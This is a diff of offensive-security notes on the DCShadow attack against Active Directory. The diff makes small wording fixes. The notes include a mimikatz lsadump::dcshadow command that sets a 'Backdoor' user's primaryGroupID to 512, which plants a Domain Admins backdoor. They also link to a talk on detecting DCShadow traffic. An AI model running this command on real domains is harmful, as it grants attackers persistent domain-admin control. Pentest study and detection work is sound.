@@ -19,7 +19,7 @@ DCShadows appears similar to DCSync put they're almost the reverse of eachother.
 From mimikatz run
 
 `lsadump::dcshadow /object:'object' /attribute:'attribute' /value:'value'`
-- object: the distinguished name of the Ad object to modify
+- object: the distinguished name of the AD object to modify
 - attribute: the name of the AD schema attribute to modify
 - value: the objecteds new value
 
@@ -30,7 +30,7 @@ to push the changes
 for example
 `lsadump::dcshadow /object:'CN=Backdoor,CN=Users,DC=scrm,DC=local' /attribute:primaryGroupID /value:512`
 
-adds the user `scrm.local\backdoor` to the domain admins group
+adds the user `scrm.local\backdoor` to the domain admins group (RID 512)
 
 <a href="https://www.youtube.com/watch?v=SOr_G8oOstc&t=3037s">Detecting DCSync and DCShadow Network Traffic
 </a>
